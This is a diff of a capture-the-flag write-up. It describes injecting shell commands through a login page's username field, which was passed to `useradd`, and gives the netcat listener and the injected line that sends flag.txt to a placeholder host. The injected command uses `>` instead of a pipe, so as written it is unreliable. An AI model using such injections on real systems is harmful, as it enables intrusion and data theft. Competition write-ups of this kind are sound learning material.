@@ -16,8 +16,8 @@ My four-person team managed to solve two of the challenges to finish in 4th plac
 
 I realized after that revelation that the script was simply inputing the login information from the field into the bash command `useradd`, and so by adding a semicolon to the end of the command, `useradd;`, we would be able to execute any bash command. The only problem was that after execution the page simply stated that the account was created and gave no mention as to what the command did or what output it produced.  After considering few different ways of overcoming this dilema, I decided that setting up a `netcat` service to listen on my computer and then pipe the result from the login into netcat to my computer would be the most efficient way to see the results.  After exploring the filesystem by executing `ls` for a few minutes I found the `flag.txt` file, completing the challenge.  The commands I ended up using were these:
 
-Laptop: `netcat -l 8080 > flag.txt`
+Laptop: `nc -l 8080 > flag.txt`
 
-Server (Username field): `a; cat ../../../../flag.txt > ncat MYIP 8080`
+Server (Username field): `a; cat ../../../../flag.txt > nc MYIP 8080`
 
 Overall I found the event to be a great experience, allowing me to see how computer security ties into real life and also providing my team and I with an amazingly fun and entertaining CTF. Thanks to everyone who organized it and I can't wait to attend next year!
